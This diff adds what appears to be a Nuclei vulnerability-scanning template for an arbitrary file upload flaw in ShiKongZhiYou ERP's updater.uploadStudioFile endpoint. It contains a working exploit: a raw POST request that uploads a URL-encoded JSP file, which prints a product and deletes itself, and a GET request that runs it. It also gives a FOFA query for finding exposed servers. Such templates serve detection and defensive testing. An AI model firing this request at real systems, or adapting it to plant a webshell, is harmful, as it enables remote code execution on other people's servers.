@@ -1,0 +1,37 @@
+id: shikongzhiyou-erp-uploadStudioFile-fileupload
+
+info:
+  name: ShiKongZhiYou ERP updater.uploadStudioFile Arbitrary File Upload
+  author: Co5mos
+  severity: critical
+  description: |
+    时空智友ERP `updater.uploadStudioFile` 接口存在任意文件上传漏洞，攻击者可通过漏洞上传 webshell，从而控制 web 服务器的权限。
+  metadata:
+    fofa-query: 'body="login.jsp?login=null"'
+  tags: fileupload, shikongzhiyou, rce
+
+variables:
+  filename: "{{rand_base(6)}}.jsp"
+  num1: "{{rand_int(10000, 20000)}}"
+  num2: "{{rand_int(10000, 20000)}}"
+  num1_url_encoded: "{{url_encode(num1)}}"
+  num2_url_encoded: "{{url_encode(num2)}}"
+  result: "{{to_number(num1)*to_number(num2)}}"
+
+http:
+  - raw:
+    - |
+      POST /formservice?service=updater.uploadStudioFile HTTP/1.1
+      Host: {{Hostname}}
+      Content-Type: application/x-www-form-urlencoded
+
+      content=<?xml%20version="1.0"?><root><filename>{{filename}}</filename><filepath>./</filepath><filesize>172</filesize><lmtime>1970-01-01%2008:00:00</lmtime></root><!--%3c%25%20%6f%75%74%2e%70%72%69%6e%74%6c%6e%28{{num1_url_encoded}}%2a{{num2_url_encoded}}%29%3b%6e%65%77%20%6a%61%76%61%2e%69%6f%2e%46%69%6c%65%28%61%70%70%6c%69%63%61%74%69%6f%6e%2e%67%65%74%52%65%61%6c%50%61%74%68%28%72%65%71%75%65%73%74%2e%67%65%74%53%65%72%76%6c%65%74%50%61%74%68%28%29%29%29%2e%64%65%6c%65%74%65%28%29%3b%20%25%3e-->
+
+    - |
+      GET /update/temp/studio/{{filename}} HTTP/1.1
+      Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code_2 == 200 && contains(body_2,'{{result}}')"
